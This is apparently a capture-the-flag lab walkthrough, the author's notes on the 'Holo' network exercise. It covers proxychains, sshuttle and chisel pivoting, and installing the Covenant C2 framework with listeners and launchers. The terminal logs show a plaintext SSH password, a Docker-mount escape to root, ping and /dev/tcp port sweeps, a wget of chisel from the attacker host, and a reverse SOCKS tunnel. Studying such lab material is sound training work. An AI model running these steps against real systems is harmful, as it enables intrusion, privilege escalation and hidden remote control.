Now that we have a SOCKs server set up, we need to interpret and manage these connections. This is where proxychains come in. Proxychains allows us to connect to the SOCKs server and route traffic through the proxy in the command line. To add the SOCKs server to proxychains, you will need to edit `/etc/proxychains.conf`. You can see an example configuration below.
![](https://i.imgur.com/PLDdyI8.png)
You will need to add the following line to the configuration file: `socks5 127.0.0.1 1080`
To use the proxy, you will need to prepend any commands you want to route through the proxy with proxychains. An example usage can be found below.
Example usage: `proxychains curl http://<IP>`
The second tool we will be looking at is sshuttle. Sshuttle is unique in its approaches to pivoting because all of its techniques are done remotely from the attacking machine and do not require the configuration of proxychains. However, a few of the disadvantages of sshuttle are that it will only work if there is an ssh server running on the machine, and it will not work on Windows hosts. You can download sshuttle from GitHub, [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)
Using sshuttle is relatively easy and only requires one command. For sshuttle to work, you only need to specify one parameter, -r . With this parameter, you will specify the user and target like you would for a standard ssh connection. You will also need to specify the CIDR range of the network; this does not require a parameter. Find an example of syntax below.
Syntax: `sshuttle -r USER@MACHINE_IP 0.0.0.0/0`
For more information about sshuttle and how to use it, check out the documentation, [https://sshuttle.readthedocs.io/en/stable/overview.html](https://sshuttle.readthedocs.io/en/stable/overview.html).
Answer the questions below
Read the above section and use Chisel or SSHuttle to pivot into the internal network!
Completed
```go
──(kali㉿kali)-[~/Holo]
└─$ sshuttle                                                     
Command 'sshuttle' not found, but can be installed with:
sudo apt install sshuttle
Do you want to install it? (N/y)y
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ sshuttle -h
usage: sshuttle [-l [ip:]port] -r [user@]sshserver[:port] <subnets...>

positional arguments:
  IP/MASK[:PORT[-PORT]]...
                        capture and forward traffic to these subnets (whitespace separated)

options:
  -h, --help            show this help message and exit
  -l [IP:]PORT, --listen [IP:]PORT
                        transproxy to this ip address and port number
  -H, --auto-hosts      continuously scan for remote hostnames and update local /etc/hosts as they are found
  -N, --auto-nets       automatically determine subnets to route
  --dns                 capture local DNS requests and forward to the remote DNS server
  --ns-hosts IP[,IP]    capture and forward DNS requests made to the following servers (comma separated)
  --to-ns IP[:PORT]     the DNS server to forward requests to; defaults to servers in /etc/resolv.conf on remote side if not
                        given.
  --method TYPE         auto, nat, nft, tproxy, pf, ipfw
  --python PATH         path to python interpreter on the remote server
  -r [USERNAME[:PASSWORD]@]ADDR[:PORT], --remote [USERNAME[:PASSWORD]@]ADDR[:PORT]
                        ssh hostname (and optional username and password) of remote sshuttle server
  -x IP/MASK[:PORT[-PORT]], --exclude IP/MASK[:PORT[-PORT]]
                        exclude this subnet (can be used more than once)
  -X PATH, --exclude-from PATH
                        exclude the subnets in a file (whitespace separated)
  -v, --verbose         increase debug message verbosity (can be used more than once)
  -V, --version         print the sshuttle version number and exit
  -e CMD, --ssh-cmd CMD
                        the command to use to connect to the remote [ssh]
  --seed-hosts HOSTNAME[,HOSTNAME]
                        comma-separated list of hostnames for initial scan (may be used with or without --auto-hosts)
  --no-latency-control  sacrifice latency to improve bandwidth benchmarks
  --latency-buffer-size SIZE
                        size of latency control buffer
  --wrap NUM            restart counting channel numbers after this number (for testing)
  --disable-ipv6        disable IPv6 support
  -D, --daemon          run in the background as a daemon
  -s PATH, --subnets PATH
                        file where the subnets are stored, instead of on the command line
  --syslog              send log messages to syslog (default if you use --daemon)
  --pidfile PATH        pidfile name (only if using --daemon) [./sshuttle.pid]
  --user USER           apply all the rules only to this linux user
  --firewall            (internal use only)
  --hostwatch           (internal use only)
  --sudoers-no-modify   Prints a sudo configuration to STDOUT which allows a user to run sshuttle without a password. This option
                        is INSECURE because, with some cleverness, it also allows the user to run any command as root without a
                        password. The output also includes a suggested method for you to install the configuration.
  --sudoers-user SUDOERS_USER
                        Set the user name or group with %group_name for passwordless operation. Default is the current user. Only
                        works with the --sudoers-no-modify option.
  --no-sudo-pythonpath  do not set PYTHONPATH when invoking sudo
  -t [MARK], --tmark [MARK]
                        tproxy optional traffic mark with provided MARK value in hexadecimal (default '0x01')
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ chisel -h              

  Usage: chisel [command] [--help]

  Version: 0.0.0-src (go1.15.7)

  Commands:
    server - runs chisel in server mode
    client - runs chisel in client mode

  Read more:
    https://github.com/jpillora/chisel
```
```go
$ chisel server --port $PORT --proxy http://example.com
```
```go
# listens on $PORT, proxy web requests to http://example.com

This demo app is also running a [simple file server](https://www.npmjs.com/package/serve) on `:3000`, which is normally inaccessible due to Heroku's firewall. However, if we tunnel in with:
```
```go
$ chisel client https://chisel-demo.herokuapp.com 3000
```
```go
# connects to chisel server at https://chisel-demo.herokuapp.com,
```
```go
# tunnels your localhost:3000 to the server's localhost:3000

and then visit [localhost:3000](http://localhost:3000/), we should see a directory listing. Also, if we visit the [demo app](https://chisel-demo.herokuapp.com/) in the browser we should hit the server's default proxy and see a copy of [example.com](http://example.com/).

first using chisel then sshuttle :)
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ ssh linux-admin@10.200.108.33
The authenticity of host '10.200.108.33 (10.200.108.33)' can't be established.
ED25519 key fingerprint is SHA256:cdHmwENPP5UGhSE2piqvjB32AuZZiEEMB+oWkNp79QY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.108.33' (ED25519) to the list of known hosts.
linux-admin@10.200.108.33's password: linuxrulez
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-1030-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Feb  1 18:43:53 UTC 2023

  System load:                      0.0
  Usage of /:                       97.2% of 7.69GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        138
  Users logged in:                  0
  IPv4 address for br-19e3b4fa18b8: 192.168.100.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.200.108.33

  => / is using 97.2% of 7.69GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

107 updates can be installed immediately.
11 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Sat Jan 16 19:48:21 2021 from 10.41.0.2

linux-admin@ip-10-200-108-33:~$ docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh -p
```
```go
# whoami
root
```
```go
# bash
            .-/+oossssoo+/-.               root@7d2b9c058400 
        `:+ssssssssssssssssss+:`           ----------------- 
      -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.1 LTS x86_64 
    .ossssssssssssssssssdMMMNysssso.       Host: HVM domU 4.2.amazon 
   /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.4.0-1030-aws 
  +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 14 mins 
 /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 709 (dpkg) 
.ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 5.0.17 
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Terminal: kthreadd 
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   CPU: Intel Xeon E5-2676 v3 (2) @ 2.399GHz 
ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: 00:02.0 Cirrus Logic GD 5446 
+sssshhhyNMMNyssssssssssssyNMMMysssssss+   Memory: 725MiB / 3933MiB 
.ssssssssdMMMNhsssssssssshNMMMdssssssss.
 /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/                            
  +sssssssssdmydMMMMMMMMddddyssssssss+                             
   /ssssssssssshdmNNNNmyNMMMMhssssss/
    .ossssssssssssssssssdMMMNysssso.
      -+sssssssssssssssssyyyssss+-
        `:+ssssssssssssssssss+:`
            .-/+oossssoo+/-.

root@7d2b9c058400:/tmp# for i in {1..254} ;do (ping -c 1 10.200.108.$i | grep "bytes from" | awk '{print $4}' | cut -d ":" -f 1 &) ;done
10.200.108.1
10.200.108.30
10.200.108.31
10.200.108.33
10.200.108.35
10.200.108.250

root@7d2b9c058400:/tmp# for ip in 30 31 35; do echo "10.200.108.$ip:"; for i in {1..15000}; do echo 2>/dev/null > /dev/tcp/10.200.108.$ip/$i && echo "$i open"; done; echo " ";done;
10.200.108.30:
53 open
80 open
88 open
135 open
139 open
389 open
445 open
464 open
593 open
636 open
3268 open
3269 open
3389 open
5985 open
9389 open
 
10.200.108.31:
22 open
80 open
135 open
139 open
443 open
445 open
3306 open
3389 open
5985 open
 
10.200.108.35:
80 open
135 open
139 open
445 open
3389 open
5985 open
```
```go
┌──(kali㉿kali)-[/usr/bin]
└─$ locate chisel
/usr/bin/chisel
```
```go
┌──(kali㉿kali)-[/usr/bin]
└─$ cd /home/kali/Holo
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ cp /usr/bin/chisel chisel
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ ls           
bash_scan.sh  chisel  fake_id_rsa  fake_id_rsa.pub  hash  python_scan.py  rev.sh
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.200.108.33 - - [01/Feb/2023 13:58:05] "GET /chisel HTTP/1.1" 200 -

root@7d2b9c058400:/# ls
bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var
root@7d2b9c058400:/# cd /tmp
root@7d2b9c058400:/tmp# ls
systemd-private-aca452dce5744e4f98e08f8c04365df0-apache2.service-i2HSij
systemd-private-aca452dce5744e4f98e08f8c04365df0-systemd-logind.service-uuMRhi
systemd-private-aca452dce5744e4f98e08f8c04365df0-systemd-resolved.service-cx0WSh
systemd-private-aca452dce5744e4f98e08f8c04365df0-systemd-timesyncd.service-NXeoRe
root@7d2b9c058400:/tmp# wget http://10.50.104.206:1337/chisel
--  http://10.50.104.206:1337/chisel
Connecting to 10.50.104.206:1337... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8750072 (8.3M) [application/octet-stream]
Saving to: 'chisel'

chisel                    100%[====================================>]   8.34M  2.27MB/s    in 4.7s    

(1.76 MB/s) - 'chisel' saved [8750072/8750072]

root@7d2b9c058400:/tmp# chmod +x chisel

root@7d2b9c058400:/tmp# ./chisel client 10.50.104.206:8000 R:socks
 client: Connecting to ws://10.50.104.206:8000
 client: Connected (Latency 220.455406ms)
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ chisel server -p 8000 --reverse
 server: Reverse tunnelling enabled
 server: Fingerprint 4QCS/I+yxlwhuLgmhXcDqT8YT5Bl/N7o0tBK9Tpeeqc=
 server: Listening on http://0.0.0.0:8000
 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ sudo nano /etc/proxychains.conf 
[sudo] password for kali:
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ tail /etc/proxychains.conf
```
```go
#       proxy types: http, socks4, socks5
```
```go
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
```
```go
# add proxy here ...
```
```go
# meanwile
```
```go
# defaults set to "tor"
#socks4 127.0.0.1 9050	
#socks5 127.0.0.1 9050
socks5 127.0.0.1 1080

using foxyproxy

Title: chisel Proxy Type : SOCKS5    Proxy IP address or DNS name : 127.0.0.1    Port : 1080

http://10.200.108.30/ and http://10.200.108.35/ (Windows server)
Now visit http://10.200.108.31/ (login page)

----

using sshuttle
```
```go
┌──(kali㉿kali)-[~/Holo]
└─$ sshuttle -r linux-admin@10.200.108.33 10.200.108.0/24 
linux-admin@10.200.108.33's password: 
                                      c : Connected to server.

and visit login page http://10.200.108.31/ (without foxyproxy activated)
```
![[Pasted image 20230201140859.png]]
![[Pasted image 20230201141120.png]]
### Command and Control Command your Foes and Control your Friends
From scanning the internal network, we know that the rest of the network is Windows hosts. When in an engagement, red teams will often utilize a C2 server as a base of operations to help operationalize payloads and maintain access using modules. We will be setting up our C2 server and getting familiar with its operations before moving on to attacking the rest of the network.
We can use a command and control server to organize users and deploy modules or tasks on a compromised device. Rather than using reverse shells and payloads, you can use a stager and listeners with a C2 server to help a red team through an engagement. Throughout this walkthrough, we will use the [Covenant](https://github.com/cobbr/Covenant), developed by Cobbr and the SpectreOps Team. If you prefer to use another C2 framework like Empire or Cobalt Strike, you can use them; however, the modules and stagers may be different than shown.
From the Covenant GitHub, "Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers."
![](https://raw.githubusercontent.com/wiki/cobbr/Covenant/covenant.png)
For more information about Covenant, check out the Covenant GitHub wiki, [](https://github.com/cobbr/Covenant/wiki)[https://github.com/cobbr/Covenant/wiki](https://github.com/cobbr/Covenant/wiki)
The Covenant installation is relatively straightforward, with a few quirks and areas that may need troubleshooting. The installation requires two separate central installs: .NET Core SDK and downloading Covenant itself.
To begin setting up Covenant, we will begin with installing the .NET Core SDK. Covenant requires .NET Core SDK 3.1.0. You can download the SDK from either the .NET downloads page or adding the .NET repositories and downloading via apt.
For more information about downloading via the downloads page, check out this link, [https://dotnet.microsoft.com/download/dotnet/3.1](https://dotnet.microsoft.com/download/dotnet/3.1).
For more information about downloading via the repositories, check out this link, [https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu](https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu)
Follow along with either of the methods and install .NET Core SDK 3.1.0. This will be the utility we use to build and run Covenant.
Once you have the SDK installed, you can clone the Covenant repository from GitHub. Find an example below.
Command used: `git clone --recurse-submodules https://github.com/cobbr/Covenant`
Since Covenant is written entirely in .NET Core, all dependencies are already handled when building with the SDK.
Now that both the SDK and Covenant are installed, we can start up Covenant for the first time. Covenant will start on localhost port 7443. Find example syntax below.
Command used: `sudo ./dotnet run --project /opt/Covenant/Covenant`
Once you navigate to [127.0.0.1:7443](http://127.0.0.1:7443/) you will be greeted with a user creation screen. Create a user and sign in to Covenant. Find an example of the sign-in page below.
![](https://i.imgur.com/NResXyy.png)
If successfully signed in, you should be met with a dashboard like the one shown below.
![](https://i.imgur.com/Ey3jVR8.png)
Answer the questions below
Read the above and install Covenant or another preferred C2 server.
Completed
```text
https://captainroot.com/blog/getting-started-with-covenant-c2-in-kali-linux/  (follow steps)
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ git clone --recurse-submodules https://github.com/cobbr/Covenant
Cloning into 'Covenant'...
remote: Enumerating objects: 7855, done.
remote: Counting objects: 100% (2070/2070), done.
remote: Compressing objects: 100% (221/221), done.
remote: Total 7855 (delta 1914), reused 1850 (delta 1849), pack-reused 5785
Receiving objects: 100% (7855/7855), 34.17 MiB | 12.44 MiB/s, done.
Resolving deltas: 100% (5239/5239), done.
Updating files: 100% (987/987), done.
Submodule 'Covenant/Data/ReferenceSourceLibraries/Rubeus' (https://github.com/GhostPack/Rubeus) registered for path 'Covenant/Data/ReferenceSourceLibraries/Rubeus'
Submodule 'Covenant/Data/ReferenceSourceLibraries/Seatbelt' (https://github.com/GhostPack/Seatbelt) registered for path 'Covenant/Data/ReferenceSourceLibraries/Seatbelt'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpDPAPI' (https://github.com/GhostPack/SharpDPAPI) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpDPAPI'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpDump' (https://github.com/GhostPack/SharpDump) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpDump'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpSC' (https://github.com/djhohnstein/SharpSC) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpSC'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpSploit' (https://github.com/cobbr/SharpSploit) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpSploit'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpUp' (https://github.com/GhostPack/SharpUp) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpUp'
Submodule 'Covenant/Data/ReferenceSourceLibraries/SharpWMI' (https://github.com/GhostPack/SharpWMI) registered for path 'Covenant/Data/ReferenceSourceLibraries/SharpWMI'
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/Rubeus'...
remote: Enumerating objects: 2599, done.        
remote: Counting objects: 100% (895/895), done.        
remote: Compressing objects: 100% (201/201), done.        
remote: Total 2599 (delta 754), reused 732 (delta 694), pack-reused 1704        
Receiving objects: 100% (2599/2599), 1.08 MiB | 2.62 MiB/s, done.
Resolving deltas: 100% (2034/2034), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/Seatbelt'...
remote: Enumerating objects: 1535, done.        
remote: Counting objects: 100% (358/358), done.        
remote: Compressing objects: 100% (134/134), done.        
remote: Total 1535 (delta 240), reused 304 (delta 224), pack-reused 1177        
Receiving objects: 100% (1535/1535), 1.02 MiB | 1.74 MiB/s, done.
Resolving deltas: 100% (1076/1076), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpDPAPI'...
remote: Enumerating objects: 733, done.        
remote: Counting objects: 100% (148/148), done.        
remote: Compressing objects: 100% (72/72), done.        
remote: Total 733 (delta 99), reused 91 (delta 76), pack-reused 585        
Receiving objects: 100% (733/733), 1.46 MiB | 2.63 MiB/s, done.
Resolving deltas: 100% (461/461), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpDump'...
remote: Enumerating objects: 22, done.        
remote: Total 22 (delta 0), reused 0 (delta 0), pack-reused 22        
Receiving objects: 100% (22/22), 9.54 KiB | 2.38 MiB/s, done.
Resolving deltas: 100% (5/5), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpSC'...
remote: Enumerating objects: 19, done.        
remote: Total 19 (delta 0), reused 0 (delta 0), pack-reused 19        
Receiving objects: 100% (19/19), 11.45 KiB | 293.00 KiB/s, done.
Resolving deltas: 100% (7/7), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpSploit'...
remote: Enumerating objects: 1737, done.        
remote: Counting objects: 100% (275/275), done.        
remote: Compressing objects: 100% (109/109), done.        
remote: Total 1737 (delta 173), reused 252 (delta 163), pack-reused 1462        
Receiving objects: 100% (1737/1737), 19.25 MiB | 11.06 MiB/s, done.
Resolving deltas: 100% (1130/1130), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpUp'...
remote: Enumerating objects: 194, done.        
remote: Counting objects: 100% (137/137), done.        
remote: Compressing objects: 100% (60/60), done.        
remote: Total 194 (delta 84), reused 109 (delta 74), pack-reused 57        
Receiving objects: 100% (194/194), 71.11 KiB | 547.00 KiB/s, done.
Resolving deltas: 100% (105/105), done.
Cloning into '/home/kali/Holo/Covenant/Covenant/Data/ReferenceSourceLibraries/SharpWMI'...
remote: Enumerating objects: 88, done.        
remote: Counting objects: 100% (22/22), done.        
remote: Compressing objects: 100% (10/10), done.        
remote: Total 88 (delta 17), reused 12 (delta 12), pack-reused 66        
Receiving objects: 100% (88/88), 40.83 KiB | 351.00 KiB/s, done.
Resolving deltas: 100% (41/41), done.
Submodule path 'Covenant/Data/ReferenceSourceLibraries/Rubeus': checked out '1e9fe7c3c2d0458f8200f248079485f3527f314f'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/Seatbelt': checked out '907f5d702e8ffef1b6b05fc1ea88440ec4ae9170'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpDPAPI': checked out 'ea8abe46f2cf9bd40c2c81b998676256eca705ee'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpDump': checked out '41cfcf9b1abed2da79a93c201cbd38fbbe31684c'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpSC': checked out 'adbbc7fb8be7087c18a1701ca6e906ad5e141f27'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpSploit': checked out '4bf3d2aa44d73b674867a1d28cc90a3bd54f100f'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpUp': checked out '0b3f09fd2d6f91251e62ad3702ad309f8ed5c6df'
Submodule path 'Covenant/Data/ReferenceSourceLibraries/SharpWMI': checked out 'f01fda9c32e75f8b10238c032c3424c6ad733d0f'

└─$ dotnet --list-sdks
3.1.426 [/usr/share/dotnet/sdk]
6.0.404 [/usr/share/dotnet/sdk]
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ wget https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh
--  https://dotnet.microsoft.com/download/dotnet/scripts/v1/dotnet-install.sh
Resolving dotnet.microsoft.com (dotnet.microsoft.com)... 13.107.237.33, 13.107.238.33, 2620:1ec:4e:1::33, ...
Connecting to dotnet.microsoft.com (dotnet.microsoft.com)|13.107.237.33|:443... connected.
HTTP request sent, awaiting response... 200 OK
Cookie coming from dotnet.microsoft.com attempted to set domain to dotnetwebsite.azurewebsites.net
Cookie coming from dotnet.microsoft.com attempted to set domain to dotnetwebsite.azurewebsites.net
Length: 58293 (57K) [application/x-sh]
Saving to: ‘dotnet-install.sh’

dotnet-install.sh     100%[======================>]  56.93K  --.-KB/s    in 0.08s   

(729 KB/s) - ‘dotnet-install.sh’ saved [58293/58293]
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ ls
bash_scan.sh  Covenant           fake_id_rsa      hash            rev.sh
chisel        dotnet-install.sh  fake_id_rsa.pub  python_scan.py
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ chmod +x dotnet-install.sh
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ ./dotnet-install.sh --channel 3.1
dotnet-install: Note that the intended use of this script is for Continuous Integration (CI) scenarios, where:
dotnet-install: - The SDK needs to be installed without user interaction and without admin rights.
dotnet-install: - The SDK installation doesn't need to persist across multiple CI runs.
dotnet-install: To set up a development environment or to run apps, use installers rather than this script. Visit https://dotnet.microsoft.com/download to get the installer.

dotnet-install: Attempting to download using primary link https://dotnetcli.azureedge.net/dotnet/Sdk/3.1.426/dotnet-sdk-3.1.426-linux-x64.tar.gz
dotnet-install: Extracting zip from https://dotnetcli.azureedge.net/dotnet/Sdk/3.1.426/dotnet-sdk-3.1.426-linux-x64.tar.gz
dotnet-install: Installed version is 3.1.426
dotnet-install: Adding to current process PATH: `/home/kali/.dotnet`. Note: This change will be visible only when sourcing script.
dotnet-install: Note that the script does not resolve dependencies during installation.
dotnet-install: To check the list of dependencies, go to https://learn.microsoft.com/dotnet/core/install, select your operating system and check the "Dependencies" section.
dotnet-install: Installation finished successfully.
```
```text
┌──(kali㉿kali)-[~/Holo]
└─$ cd Covenant/Covenant
```
```text
┌──(kali㉿kali)-[~/Holo/Covenant/Covenant]
└─$ ~/.dotnet/dotnet run                         

Welcome to .NET Core 3.1!
---------------------
SDK Version: 3.1.426

----------------
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Find out what's new: https://aka.ms/dotnet-whats-new
Learn about the installed HTTPS developer cert: https://aka.ms/aspnet-core-https
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli-docs
Write your first app: https://aka.ms/first-net-core-app
--------------------------------------------------------------------------------------
/home/kali/.dotnet/sdk/3.1.426/NuGet.targets(128,5): error : Access to the path '/home/kali/Holo/Covenant/Covenant/obj/5d6b42ae-42ad-48e2-af7f-e865d6356ec9.tmp' is denied. [/home/kali/Holo/Covenant/Covenant/Covenant.csproj]
/home/kali/.dotnet/sdk/3.1.426/NuGet.targets(128,5): error :   Permission denied [/home/kali/Holo/Covenant/Covenant/Covenant.csproj]

The build failed. Fix the build errors and run again.
```
```text
┌──(kali㉿kali)-[~/Holo/Covenant/Covenant]
└─$ sudo ~/.dotnet/dotnet run

Welcome to .NET Core 3.1!
---------------------
SDK Version: 3.1.426

Telemetry
---------
The .NET Core tools collect usage data in order to help us improve your experience. It is collected by Microsoft and shared with the community. You can opt-out of telemetry by setting the DOTNET_CLI_TELEMETRY_OPTOUT environment variable to '1' or 'true' using your favorite shell.

Read more about .NET Core CLI Tools telemetry: https://aka.ms/dotnet-cli-telemetry

----------------
Explore documentation: https://aka.ms/dotnet-docs
Report issues and find source on GitHub: https://github.com/dotnet/core
Find out what's new: https://aka.ms/dotnet-whats-new
Learn about the installed HTTPS developer cert: https://aka.ms/aspnet-core-https
Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli-docs
Write your first app: https://aka.ms/first-net-core-app
--------------------------------------------------------------------------------------
Found default JwtKey, replacing with auto-generated key...
warn: Microsoft.EntityFrameworkCore.Model.Validation[10400]
      Sensitive data logging is enabled. Log entries and exception messages may include sensitive application data, this mode should only be enabled during development.
Covenant has started! Navigate to https://127.0.0.1:7443 in a browser
Creating cert...
warn: Microsoft.AspNetCore.DataProtection.KeyManagement.XmlKeyManager[35]
      No XML encryptor configured. Key {494463ac-0f3c-4698-b6dc-09236b0c7b13} may be persisted to storage in unencrypted form.

go to https://127.0.0.1:7443  and register quickly
```
![[Pasted image 20230201153402.png]]
### Command and Control Bug on the Wire
Now that we have Covenant set up and signed in, we can begin covering the basics of operating and creating a listener with Covenant. This will be helpful later when you get onto a Windows box and deploy a grunt quickly.
When operating with Covenant, there are four main stages: creating a listener, generating a stager, deploying a grunt, utilizing the grunt. All stages of operation can already be done using other tools like MSFVenom, Netcat, Metasploit, etc. however, Covenant gives you a way to operationalize them all under one platform allowing for easier management and collaborative operations.
Covenant is an extensive and diverse command and control framework with many different functionalities. We will only be covering the basics of operating with Covenant. For more information, check out the SpecterOps blog, [https://posts.specterops.io/](https://posts.specterops.io/), and the SoCon talk on "Operating with Covenant" by Ryan Cobb and Justin Bui [https://www.youtube.com/watch?v=oN_0pPI6TYU](https://www.youtube.com/watch?v=oN_0pPI6TYU).
The first step in operating with Covenant is to create a listener. Listeners are built off profiles; you can think of profiles like HTTP requests/pages that will serve as the channel that will handle all C2 traffic. There are four default profiles that Covenant comes with, outlined below.
-   `CustomHttpProfile` Custom profile that does not require any cookies.
-   `DefaultBridgeProfile` Default profile for a C2 bridge.
-   `DefaultHttpProfile` Default HTTP profile.
-   `TCPBridgeProfile` Default TCP profile for a C2 bridge.
Covenant offers an easy way of editing the listeners along with a GUI. There are many parameters present; we will only be going over a quick overview of each parameter outlined below.
-   `Name` Name of profile to be used throughout the interface.
-   `Description` Description of profile and its use cases.
-   `MessageTransform` Specify how data will be transformed before being placed in other parameters.
-   `HttpUrls` list of URLs the grunt can callback to.
-   `HttpRequestHeaders` List of header pairs (name/value) that will be sent with every HTTP request.
-   `HttpResponseHeaders` List of header pairs (name/value) that will be sent with every HTTP response.
-   `HttpPostRequest` Format of data when a grunt posts data back to the profile.
-   `HttpGetResponse` HTTP response when a grunt GETs data to the listener.
-   `HttpPostResponse` HTTP response when a grunt POSTs data to the listener.
We will be going further in-depth with editing and creating profiles in Task 26.
Once you have decided what profile you would like to use, we can begin creating the listener. We recommend using the _DefaultHttpProfile_, to start with, but we will be changing this in later tasks when dealing with AV evasion.
To create a listener, navigate to the _Listeners_ tab from the side menu and select _Create Listener_.
You will see several options to edit; each option is outlined below.
-   `Name` (optional) will help to identify different listeners.
-   `BindAddress` Local address listener will bind on, usually `0.0.0.0`.
-   `BindPort` Local port listener will bind on.
-   `ConnectPort` Port to callback to, suggested to set to `80`, `8080`, or `8888`.
-   `ConnectAddresses` Addresses for the listener to callback to, hostname portion of the `URL`.
-   `URLs` Callback URLs the grunt will be connected directly back to.
-   `UseSSL` Determines whether or not the listener uses `HTTP` or `HTTPS`.
-   `SSLCertificate` Certificate used by the listener if SSL is set to true.
-   `SSLCertificatePassword` Password being used by the `SSLCertificate`.
-   `HttpProfile` Profile used by the listener and grunt to determine communication behavior.
To create a basic listener for this network we only suggest editing the `Name`, `ConnectPort`, and `ConnectAddresses`
Once created, the listener should appear within the Listeners tab. You can now start and stop the listener as needed.
![](https://i.imgur.com/6mFpwNR.png)
Answer the questions below
Read the above and create a listener within Covenant.
Completed
![[Pasted image 20230201155806.png]]
### Command and Control The Blood Oath
Now that we have a listener in Covenant, we can create a launcher to deploy a grunt. Again, this will be helpful later when you get onto a Windows box and need to deploy a grunt quickly.
From the Covenant GitHub, "Launchers are used to generate, host, and download binaries, scripts, and one-liners to launch new Grunts."
There are ten different launchers to choose from within Covenant, each launcher will have its requirements, and some may not be supported on modern operating systems. Launcher types are outlined below.
-   `Binary` Generates a custom binary to launch grunt, does not rely on a system binary.
-   `Shellcode` Converts binary to shellcode using donut, [](https://github.com/TheWover/donut)[https://github.com/TheWover/donut](https://github.com/TheWover/donut)
-   `PowerShell` Generates PowerShell code to launch a grunt using `powershell.exe`.
-   `MSBuild` Generates an MSBuild XML file to launch a grunt using `msbuild.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)[https://lolbas-project.github.io/lolbas/Binaries/Msbuild/](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/)
-   `InstallUtil` Generates an InstallUtil XML file to launch a grunt using `installutil.exe`, [](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)[https://lolbas-project.github.io/lolbas/Binaries/Installutil/](https://lolbas-project.github.io/lolbas/Binaries/Installutil/)
